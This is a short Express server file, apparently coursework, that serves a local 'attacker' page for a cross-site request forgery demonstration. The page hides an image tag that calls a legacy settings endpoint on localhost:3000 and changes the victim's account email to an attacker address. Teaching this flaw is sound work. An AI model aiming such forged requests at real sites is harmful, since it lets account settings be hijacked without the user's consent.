const express = require('express');

const app = express();

// Local-only attacker site for the CSRF coursework demonstration.
app.get('/', (_req, res) => {
  res.type('html').send(`<!doctype html>
  <title>External Site</title>
  <h1>External Site</h1>
  <p>This local page automatically requests the legacy Account Settings endpoint.</p>
  <img src="http://localhost:3000/settings/legacy-update?email=attacker%40sentinel.test" alt="tracking image">
  <p>Return to Sentinel Workspace to observe the account email change.</p>`);
});

app.listen(4000, () => console.log('CSRF attacker site: http://localhost:4000'));
